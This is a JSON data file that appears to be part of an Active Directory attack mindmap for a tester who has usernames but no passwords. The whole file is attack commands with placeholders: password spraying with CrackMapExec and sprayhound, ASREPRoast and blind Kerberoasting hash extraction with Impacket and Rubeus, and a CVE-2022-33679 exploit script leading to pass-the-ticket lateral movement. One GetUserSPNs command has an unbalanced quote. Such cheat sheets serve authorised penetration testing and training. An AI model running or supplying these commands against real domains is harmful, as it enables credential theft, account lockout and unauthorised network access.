{
  "Got Username but No Password": {
    "initial_checks": [
      "cme <IP> -u 'user' -p 'password' --pass-pol",
      "enum4linux -u 'username' -p 'password' -P <IP>"
    ],
    "attack_paths": {
      "Password Spray": {
        "get_password_policy": {
          "description": "Need creds, but should get policy before starting a spray",
          "commands": [
            "Get-ADDefaultDomainPasswordPolicy",
            {
              "FGPP": {
                "commands": [
                  "Get-ADFineGrainedPasswordPolicy -filter *",
                  "Get-ADUserResultantPasswordPolicy -Identity <user>",
                  "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols"
                ]
              }
            }
          ]
        },
        "spray_methods": [
          {
            "command": "cme smb <dc-ip> -u user.txt -p password.txt --no-bruteforce # test user=password",
            "notes": "Single test"
          },
          {
            "command": "cme smb <dc-ip> -u user.txt -p password.txt # multiple test",
            "warning": "careful of lock policy"
          },
          {
            "command": "sprayhound -U <users.txt> -d <domain> -dc <dc-ip>"
          }
        ],
        "success_state": "Clear text credentials found"
      },
      "ASREPRoast": {
        "get_users": {
          "description": "Get ASREPRoastable users (need creds)",
          "commands": [
            "Get-DomainUser -PreauthNotRequired -Properties SamAccountName",
            "MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*]->(c)) RETURN p"
          ]
        },
        "get_hash": {
          "commands": [
            "python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outputfile <hashes.domain.txt>",
            "Rubeus.exe asreproast /format:hashcat"
          ],
          "success_state": "Hash found (ASREP)"
        },
        "blind_kerberoasting": {
          "commands": [
            "Rubeus.exe kerberoast /domain:<domain> /dc:<dc-ip> /nopreauth: /asrep:<user> /spn:<users.txt>",
            {
              "get_user_spns": {
                "command": "GetUserSPNs.py -no-preauth '*asrep_users* -usersfile <user_list.txt> -dc-host <dc-ip> * <domain>/",
                "success_state": "Hash found (TGS)"
              }
            }
          ]
        },
        "cve_exploit": {
          "CVE-2022-33679": {
            "command": "python3 CVE-2022-33679.py <domain>/<user> <target>",
            "leads_to": "Lateral move (PTT)"
          }
        }
      }
    }
  }
}
